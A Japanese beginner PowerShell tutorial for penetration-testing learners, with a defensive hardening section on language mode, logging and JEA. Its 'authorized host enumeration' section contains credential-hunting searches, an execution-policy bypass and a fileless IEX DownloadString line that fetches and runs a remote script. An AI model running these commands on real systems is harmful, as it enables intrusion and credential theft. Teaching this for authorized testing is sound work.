# PowerShell

> Zero2Root | 基礎シリーズ | kodoktheGr3at | 2026

---

<!-- LC-CURRICULUM-START -->
> **カリキュラムID:** `LC-003` | **フェーズ0:** 基礎
> **推定学習時間:** 4-5時間 | **レベル:** 初級
> **前提:** LC-001
> **書籍対応:** Gray Hat Hacking（Windowsポストエクスプロイテーションの章）
<!-- LC-CURRICULUM-END -->

## 目次

1. PowerShellとは
2. ディレクトリの移動
3. ファイルとフォルダの管理
4. システム情報
5. ネットワークコマンド
6. ユーザーとプロセス
7. パイプラインとオブジェクト
8. 許可されたホスト調査
9. セキュリティノート: 制限言語モードとログ記録
10. クイックリファレンス早見表

---

## 重要な用語

この教材でよく出てくる言葉である。

| 用語 | 意味 |
|:---|:---|
| シェル | 入力したコマンドを実行するプログラム。PowerShellやCMDなど |
| コマンドレット(cmdlet) | PowerShellのコマンド。必ず `動詞-名詞` の形(例: `Get-Process`) |
| オブジェクト | PowerShellの出力はただのテキストではなく、名前付きの項目を持つデータ |
| パイプライン(`\|`) | あるコマンドの出力を、そのまま次のコマンドに流し込むこと |
| エイリアス | コマンドレットの短い別名(`ls`、`dir` はどちらも `Get-ChildItem`) |
| リモーティング | ネットワーク越しに別のマシンでPowerShellコマンドを実行すること |
| Living off the land | 攻撃者が自前のマルウェアではなく、信頼された標準ツール(PowerShellなど)を悪用すること |
| 制限言語モード(Constrained Language Mode) | スクリプトにできることを制限するロックダウンのモード |

---

## 1. 概要: PowerShellとは

PowerShellは、.NET上に構築されたMicrosoftのコマンドラインシェル兼スクリプト言語である。プレーンテキストを扱うCMDとは違い、PowerShellはオブジェクトを扱う。すべての出力は単なるテキストではなく、プロパティとメソッドを持つ完全な.NETオブジェクトだ。

セキュリティの観点から見ると、PowerShellにはいくつか重要な理由がある。

- Windows上で最もよく使われるポストエクスプロイテーションツールである（Empire、PowerSploit、Nishangなどが代表例）。
- リモーティングに対応しており、他のマシン上でコマンドを実行できる。
- Windowsに標準搭載されデフォルトで信頼されていることから、攻撃者は「Living off the Land」の手法でアンチウイルスやEDRを回避するために利用する。

```powershell
# Open PowerShell
Win + R → type "powershell" → Enter

# Open as Administrator
Win + X → "Windows PowerShell (Admin)" / "Terminal (Admin)"

# Check PowerShell version
PS C:\> $PSVersionTable

# Get help for a cmdlet
PS C:\> Get-Help Get-Process
PS C:\> Get-Help Get-Process -Examples
PS C:\> Get-Help Get-Process -Full

# Update local help files (requires internet + admin)
PS C:\> Update-Help
```

コマンドレットの命名規則: PowerShellのコマンドは`動詞-名詞`という形式に従う（`Get-Process`、`Set-Location`、`New-Item`など）。これにより予測しやすく、見つけやすくなっている。

---

## 2. ナビゲーション: ディレクトリ移動

PowerShellはネイティブのコマンドレット（`Get-ChildItem`、`Set-Location`）と、CMD/Unixスタイルのエイリアス（`dir`、`cd`、`ls`）を両方サポートしているため、どちらのシェルから移ってきても取り組みやすい。

```powershell
# Show current directory
PS C:\> Get-Location
PS C:\> pwd          # alias

# Change directory
PS C:\> Set-Location C:\Users\alex\Desktop
PS C:\> cd C:\Users\alex\Desktop    # alias

# Go up one level
PS C:\Users\alex\Desktop> cd ..

# List contents of current directory
PS C:\> Get-ChildItem
PS C:\> ls           # alias
PS C:\> dir          # alias

# List including hidden files
PS C:\> Get-ChildItem -Force

# List recursively
PS C:\> Get-ChildItem -Recurse

# List only directories
PS C:\> Get-ChildItem -Directory

# List only files matching a pattern
PS C:\> Get-ChildItem -Filter *.txt -Recurse
```

| コマンドレット | エイリアス | 機能 |
|---------------|-----------|------|
| `Get-Location` | `pwd`, `gl` | 現在のディレクトリを表示 |
| `Set-Location` | `cd`, `sl` | ディレクトリを変更 |
| `Get-ChildItem` | `dir`, `ls`, `gci` | フォルダの内容を一覧表示 |
| `Get-ChildItem -Recurse` | — | 再帰的に一覧表示 |
| `Get-ChildItem -Force` | — | 隠しファイルも含める |

---

## 3. ファイルとフォルダの管理

これらのコマンドレットはファイルやフォルダの作成、コピー、移動、削除を行い、内容の読み取りや検索も行う。

```powershell
# Create a new folder
PS C:\> New-Item -ItemType Directory -Path "newfolder"
PS C:\> mkdir newfolder      # alias

# Create a new empty file
PS C:\> New-Item -ItemType File -Path "file.txt"

# Remove a file or folder
PS C:\> Remove-Item file.txt
PS C:\> rm file.txt          # alias

# Remove a folder AND all its contents
PS C:\> Remove-Item -Path "folder" -Recurse -Force

# Copy a file
PS C:\> Copy-Item file.txt D:\backup\file.txt
PS C:\> cp file.txt D:\backup\        # alias

# Copy a folder recursively
PS C:\> Copy-Item -Path C:\source -Destination D:\dest -Recurse

# Move a file or folder
PS C:\> Move-Item file.txt D:\backup\
PS C:\> mv file.txt D:\backup\        # alias

# Rename a file or folder
PS C:\> Rename-Item oldname.txt newname.txt

# View contents of a text file
PS C:\> Get-Content file.txt
PS C:\> cat file.txt          # alias
PS C:\> type file.txt         # alias

# View only the last N lines (like tail)
PS C:\> Get-Content file.txt -Tail 10

# Search text inside files (like grep/findstr)
PS C:\> Select-String -Path "*.txt" -Pattern "password"
PS C:\> Get-Content file.txt | Select-String "password"

# Find files by name across the filesystem
PS C:\> Get-ChildItem -Path C:\ -Filter *.txt -Recurse -ErrorAction SilentlyContinue
```

| コマンドレット | エイリアス | 機能 |
|---------------|-----------|------|
| `New-Item` | `ni`, `mkdir` | 新しいファイル/フォルダを作成 |
| `Remove-Item` | `rm`, `del`, `rmdir` | ファイル/フォルダを削除 |
| `Copy-Item` | `cp`, `copy` | ファイル/フォルダをコピー |
| `Move-Item` | `mv`, `move` | ファイル/フォルダを移動 |
| `Rename-Item` | `ren` | 名前を変更 |
| `Get-Content` | `cat`, `type`, `gc` | ファイル内容を表示 |
| `Select-String` | `sls` | テキスト検索（grep相当） |

---

## 4. システム情報

これらのコマンドレットはシステム情報、ハードウェアの詳細、環境変数を取得する。多くは`CIM`/`WMI`名前空間に依存している。

```powershell
# Show OS info
PS C:\> Get-ComputerInfo

# Show specific OS details
PS C:\> Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture

# Show environment variables
PS C:\> Get-ChildItem Env:
PS C:\> $env:USERNAME
PS C:\> $env:COMPUTERNAME
PS C:\> $env:PATH

# List installed hotfixes/patches
PS C:\> Get-HotFix

# List installed software
PS C:\> Get-CimInstance -ClassName Win32_Product | Select-Object Name, Version

# Show disk drive info
PS C:\> Get-PSDrive
PS C:\> Get-CimInstance Win32_LogicalDisk

# Show BIOS / hardware info
PS C:\> Get-CimInstance Win32_BIOS
PS C:\> Get-CimInstance Win32_ComputerSystem

# Clear the screen
PS C:\> Clear-Host
PS C:\> cls          # alias
```

| コマンドレット | 機能 |
|---------------|------|
| `Get-ComputerInfo` | システム情報の全体を取得 |
| `Get-CimInstance` | WMI/CIMへの問い合わせ（OS、ハードウェアなど） |
| `Get-ChildItem Env:` | 環境変数を表示 |
| `Get-HotFix` | 適用済みホットフィックスを一覧表示 |
| `Get-PSDrive` | ドライブ/ボリュームを一覧表示 |
| `Clear-Host` | 画面をクリア |

ペンテストのメモ: `Get-HotFix`は、悪用可能な脆弱性につながりうる未適用のセキュリティパッチを特定するのに役立つ。

---

## 5. ネットワークコマンド

PowerShellは新しいネットワーク系コマンドレットを提供しつつ、`ping`や`ipconfig`のような従来のツールも呼び出せる。

```powershell
# Show IP configuration (modern cmdlet)
PS C:\> Get-NetIPConfiguration
PS C:\> Get-NetIPAddress

# Legacy equivalent (still works)
PS C:\> ipconfig /all

# Test connectivity to a host
PS C:\> Test-Connection google.com
PS C:\> ping google.com          # legacy alias still works

# Trace the route to a host
PS C:\> Test-NetConnection google.com -TraceRoute

# Test if a specific port is open
PS C:\> Test-NetConnection -ComputerName target.com -Port 443

# Show active network connections
PS C:\> Get-NetTCPConnection

# Show DNS cache
PS C:\> Get-DnsClientCache

# Resolve a domain name (DNS lookup)
PS C:\> Resolve-DnsName google.com

# Flush DNS cache
PS C:\> Clear-DnsClientCache

# Show network adapters
PS C:\> Get-NetAdapter

# Download a file from the web (like curl/wget)
PS C:\> Invoke-WebRequest -Uri http://target.com/file.txt -OutFile file.txt
PS C:\> iwr http://target.com -UseBasicParsing      # alias
```

| コマンドレット | 機能 |
|---------------|------|
| `Get-NetIPConfiguration` | 新しいIP設定表示 |
| `Test-Connection` | 疎通確認（ping相当） |
| `Test-NetConnection` | 特定ポート/接続のテスト |
| `Get-NetTCPConnection` | アクティブなTCP接続 |
| `Resolve-DnsName` | DNS名前解決 |
| `Invoke-WebRequest` | HTTPリクエスト（curl相当） |

ペンテストのメモ: `Invoke-WebRequest`（エイリアス`iwr`）と`Invoke-RestMethod`（`irm`）は、ファイルレスでメモリ上だけの攻撃連鎖に頻繁に登場する。ディスクに触れずにメモリから直接ペイロードをダウンロードして実行できるためだ。

---

## 6. ユーザーとプロセス

これらのコマンドレットはユーザーアカウントとグループを管理し、実行中のプロセスを監視する。

```powershell
# Show current logged-in user
PS C:\> whoami
PS C:\> $env:USERNAME

# Show current user's groups and privileges
PS C:\> whoami /groups
PS C:\> whoami /priv

# List all local user accounts
PS C:\> Get-LocalUser

# Show details of a specific user
PS C:\> Get-LocalUser -Name "alex"

# Create a new local user
PS C:\> New-LocalUser -Name "alex" -Password (ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force)

# Add user to local Administrators group
PS C:\> Add-LocalGroupMember -Group "Administrators" -Member "alex"

# List local groups
PS C:\> Get-LocalGroup

# List members of Administrators group
PS C:\> Get-LocalGroupMember -Group "Administrators"

# Delete a user
PS C:\> Remove-LocalUser -Name "alex"

# List running processes
PS C:\> Get-Process
PS C:\> ps          # alias

# Find a specific process
PS C:\> Get-Process | Where-Object {$_.ProcessName -like "*chrome*"}

# Kill a process by name
PS C:\> Stop-Process -Name "notepad" -Force

# Kill a process by PID
PS C:\> Stop-Process -Id 1234 -Force

# Start a new process
PS C:\> Start-Process notepad.exe
```

| コマンドレット | 機能 |
|---------------|------|
| `Get-LocalUser` | ローカルユーザーを一覧表示 |
| `New-LocalUser` | 新規ユーザーを作成 |
| `Add-LocalGroupMember` | グループに追加 |
| `Get-LocalGroupMember` | グループメンバーを表示 |
| `Get-Process` | 実行中のプロセスを一覧表示 |
| `Stop-Process` | プロセスを終了 |
| `Start-Process` | 新しいプロセスを開始 |

注意: `New-LocalUser`と`Add-LocalGroupMember`は、PowerShellを管理者として実行する必要がある。

---

## 7. パイプラインとオブジェクト

PowerShellの中核となる特徴は、オブジェクトベースのパイプラインである。あるコマンドレットの出力、つまりプロパティを持つ完全なオブジェクトは、テキストを解析することなく次のコマンドレットへそのまま渡せる。これはコマンド間で生のテキストを渡すLinuxのパイプとは異なる。

```powershell
# Filter objects with Where-Object
PS C:\> Get-Process | Where-Object {$_.CPU -gt 100}

# Sort objects
PS C:\> Get-Process | Sort-Object CPU -Descending

# Select specific properties only
PS C:\> Get-Process | Select-Object Name, Id, CPU

# Format output as a table
PS C:\> Get-Process | Format-Table -AutoSize

# Format output as a list
PS C:\> Get-Process | Format-List

# Measure / count objects
PS C:\> Get-ChildItem | Measure-Object

# Export results to CSV
PS C:\> Get-Process | Export-Csv processes.csv -NoTypeInformation

# Convert to JSON (useful for scripting/exfil)
PS C:\> Get-Process | Select-Object Name, Id | ConvertTo-Json

# ForEach loop over pipeline objects
PS C:\> Get-ChildItem | ForEach-Object { Write-Host $_.Name }
```

| コマンドレット | エイリアス | 機能 |
|---------------|-----------|------|
| `Where-Object` | `?`, `where` | オブジェクトを絞り込む |
| `Select-Object` | `select` | 特定のプロパティを選択 |
| `Sort-Object` | `sort` | オブジェクトを並べ替え |
| `ForEach-Object` | `%`, `foreach` | 各オブジェクトに対してループ |
| `Format-Table` | `ft` | テーブル形式で整形 |
| `ConvertTo-Json` | — | JSONに変換 |

---

## 8. 許可されたホスト調査

許可された業務や自分のラボ環境では、PowerShellはホストの棚卸しや設定監査に役立つ。以下のコマンドは、評価する許可を得ているシステムに対してのみ使うこと。

```powershell
# ── Basic Recon ─────────────────────────────────────
whoami /all                                    # full identity, groups, privileges
$env:USERNAME, $env:COMPUTERNAME               # quick context
Get-ComputerInfo | Select OsName, OsVersion    # OS details

# ── Execution Policy (often needs bypassing) ────────
Get-ExecutionPolicy
Set-ExecutionPolicy Bypass -Scope Process       # temporary, current session only

# ── User & Group Enumeration ────────────────────────
Get-LocalUser
Get-LocalGroupMember -Group "Administrators"

# ── Network Enumeration ─────────────────────────────
Get-NetIPConfiguration
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}

# ── Files & Credentials Hunting ─────────────────────
Get-ChildItem -Path C:\ -Include *password*,*.kdbx -Recurse -ErrorAction SilentlyContinue
Select-String -Path C:\Users\*\Desktop\*.txt -Pattern "password"
Get-ChildItem -Path C:\Users -Include *.config,*.xml -Recurse -ErrorAction SilentlyContinue | Select-String "password"

# ── PowerShell History (often contains credentials) ─
Get-Content (Get-PSReadlineOption).HistorySavePath

# ── Scheduled Tasks & Services (priv-esc vectors) ───
Get-ScheduledTask | Select TaskName, State
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-CimInstance Win32_Service | Select Name, PathName, StartMode

# ── Installed Software & Patches ────────────────────
Get-HotFix | Sort-Object InstalledOn -Descending
Get-CimInstance Win32_Product | Select Name, Version

# ── Download & execute in-memory (fileless technique) ───
IEX (New-Object Net.WebClient).DownloadString('http://target.com/script.ps1')
```

注意: これらのコマンドは、許可されたペネトレーションテストやCTF環境のみを対象としている。多くのEDR/AV製品は`IEX`、`DownloadString`、実行ポリシーのバイパスを検知するので、それぞれが何を引き起こすかを理解した上で使うこと。

---

## 9. セキュリティノート: 管理者向けハードニング、制限言語モード、ログ記録

マルウェアがPowerShellを悪用する頻度を考えると、管理者側の制御とログ記録はWindows防御の中でも重要度が高い。

```powershell
# ── Language mode (defense posture) ─────────────────────────
$ExecutionContext.SessionState.LanguageMode
# FullLanguage | ConstrainedLanguage | RestrictedLanguage | NoLanguage
# Constrained Language Mode (CLM) blocks most .NET / COM abuse while
# allowing approved cmdlets — pair with AppLocker/WDAC script rules.

# ── Execution policy (necessary but NOT a security boundary) ─
Get-ExecutionPolicy -List
# Prefer: AllSigned / RemoteSigned for admins; enforce via GPO.
# Attackers can bypass process-scoped policy — rely on WDAC + logging.

# ── Script Block Logging / Module Logging / Transcription ────
# Enable via GPO (recommended) under:
# Computer Config → Admin Templates → Windows Components → Windows PowerShell
#  - Turn on PowerShell Script Block Logging
#  - Turn on Module Logging (core modules + *)
#  - Turn on PowerShell Transcription (central share)
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 20

# ── Just Enough Administration (JEA) ─────────────────────────
# Expose only approved cmdlets/functions to remote admins
Get-PSSessionConfiguration | Format-Table Name, Permission

# ── Least privilege for interactive admins ───────────────────
# Daily work: standard user; elevate only for change windows
whoami /groups | findstr /i "Admin High Mandatory"
```

| コントロール | 目的 |
|-------------|------|
| Constrained Language Mode | 危険な.NET/COM利用を制限 |
| WDAC / AppLocker | 署名済み/承認済みスクリプトのみ許可 |
| Script Block Logging | スクリプトの内容を監査 |
| Transcription | 管理者セッションを記録 |
| JEA | リモート管理の攻撃対象範囲を最小化 |
| AMSI + Defender | 悪意あるスクリプトを検知 |

防御優先の考え方: 実行ポリシー単体はセキュリティ境界にはならない。WDAC/AppLocker、CLM、Script Block Logging、JEAを組み合わせ、イベントID 4104/4103を監視して異常な管理者操作を検知する。

---

## 10. コマンド早見表

| コマンドレット | 機能 | 管理者権限が必要か |
|---------------|------|---------------------|
| `Get-ChildItem` | フォルダの内容を一覧表示 | 不要 |
| `Set-Location` | ディレクトリを変更 | 不要 |
| `New-Item` / `Remove-Item` | ファイル/フォルダを作成・削除 | 不要（システムファイルは必要） |
| `Copy-Item` / `Move-Item` | ファイルをコピー/移動 | 不要 |
| `Get-Content` | ファイル内容を表示 | 不要 |
| `Get-ComputerInfo` | システム情報 | 不要 |
| `Get-NetIPConfiguration` | ネットワーク設定 | 不要 |
| `Test-Connection` | ネットワークテスト（ping相当） | 不要 |
| `Get-NetTCPConnection` | アクティブな接続 | 不要 |
| `whoami /all` | ユーザー情報の全体 | 不要 |
| `New-LocalUser` | ユーザー作成 | 必要 |
| `Add-LocalGroupMember` | グループ管理 | 必要 |
| `Get-Process` / `Stop-Process` | プロセス管理 | 不要（一部プロセスは必要） |
| `Get-ScheduledTask` | スケジュールタスク | 不要 |
| `Invoke-WebRequest` | HTTPリクエスト | 不要 |

---

## 実践ワークフロー例

```powershell
# ── SCENARIO: Quick Windows host enumeration ─────────

# 1. Identify who and where you are
whoami /all
Get-ComputerInfo | Select-Object OsName, OsVersion, OsArchitecture

# 2. Check network setup
Get-NetIPConfiguration
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}

# 3. Enumerate users and groups
Get-LocalUser
Get-LocalGroupMember -Group "Administrators"

# 4. Look for interesting files
Get-ChildItem -Path C:\Users -Include *password*,*.config -Recurse -ErrorAction SilentlyContinue
Select-String -Path C:\Users\*\Desktop\*.txt -Pattern "password"

# 5. Check scheduled tasks and services for priv-esc
Get-ScheduledTask | Select-Object TaskName, State
Get-CimInstance Win32_Service | Select-Object Name, PathName, StartMode

# 6. Check running processes
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
```

---

## クイックリファレンス早見表

```powershell
# ── NAVIGATION ──────────────────────────────────────────────
Set-Location <path>            # cd        — change directory
Get-Location                   # pwd       — show current directory
Get-ChildItem                  # dir, ls   — list contents
Get-ChildItem -Recurse         #           — list recursively

# ── FILE / FOLDER ───────────────────────────────────────────
New-Item -ItemType Directory <name>    # mkdir   — create folder
Remove-Item -Recurse -Force <name>     # rm /s   — delete folder + contents
Copy-Item <src> <dest>                 # cp      — copy file
Move-Item <src> <dest>                 # mv      — move file/folder
Get-Content <file>                     # cat     — view file contents
Select-String -Path <file> -Pattern "<text>"   # grep — search inside file

# ── SYSTEM INFO ─────────────────────────────────────────────
Get-ComputerInfo               # full system info
Get-CimInstance Win32_OperatingSystem   # OS details
Get-HotFix                     # installed patches
Get-ChildItem Env:              # environment variables
Clear-Host                     # cls — clear screen

# ── NETWORK ──────────────────────────────────────────────────
Get-NetIPConfiguration         # IP config
Test-Connection <host>         # ping
Test-NetConnection <host> -Port <port>   # check specific port
Get-NetTCPConnection           # active connections
Resolve-DnsName <domain>       # DNS lookup
Invoke-WebRequest -Uri <url> -OutFile <file>   # download (curl-like)

# ── USERS / PROCESSES ───────────────────────────────────────
whoami /all                    # current user, groups, privileges
Get-LocalUser                  # list local users
New-LocalUser -Name <name> -Password <securestring>
Add-LocalGroupMember -Group "Administrators" -Member <name>
Get-Process                    # list running processes
Stop-Process -Name <name> -Force   # kill process by name

# ── PIPELINE / OBJECTS ───────────────────────────────────────
Get-Process | Where-Object {$_.CPU -gt 100}    # filter
Get-Process | Sort-Object CPU -Descending      # sort
Get-Process | Select-Object Name, Id           # select fields
Get-Process | Format-Table -AutoSize           # format as table
Get-Process | ConvertTo-Json                   # convert to JSON

# ── DEFENSE / HARDENING CHECKS ──────────────────────────────
$ExecutionContext.SessionState.LanguageMode   # expect ConstrainedLanguage where enforced
Get-ExecutionPolicy -List                     # policy inventory (not a boundary alone)
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 10
Get-PSSessionConfiguration | Format-Table Name, Permission
```

---

> 参考文献:
> - Peter Kim, *The Hacker Playbook 3* (`~/Documents/Books/CyberSec/Ethical Hacking/`) — 許可された手法の文脈で参照
> - Georgia Weidman, *Penetration Testing: A Hands-On Introduction to Hacking* (`~/Documents/Books/CyberSec/Ethical Hacking/`)
> - Allen Harper et al., *Gray Hat Hacking* (`~/Documents/Books/CyberSec/Handbook/`)
> - Microsoft Docs — [PowerShell Security](https://learn.microsoft.com/en-us/powershell/scripting/security/overview)、Script Block Logging、JEA、Constrained Language Mode
> - [HackTheBox Academy - Windows Fundamentals](https://academy.hackthebox.com)
> - `Get-Help <cmdlet> -Full`

> Zero2Root | 基礎シリーズ | kodoktheGr3at | 2026
> リポジトリ: [Zero2Root](https://github.com/Kodokthegr3at/Zero2Root)
> フィードバックと貢献を歓迎します。誤りを見つけたらissueかPRを開いてください。
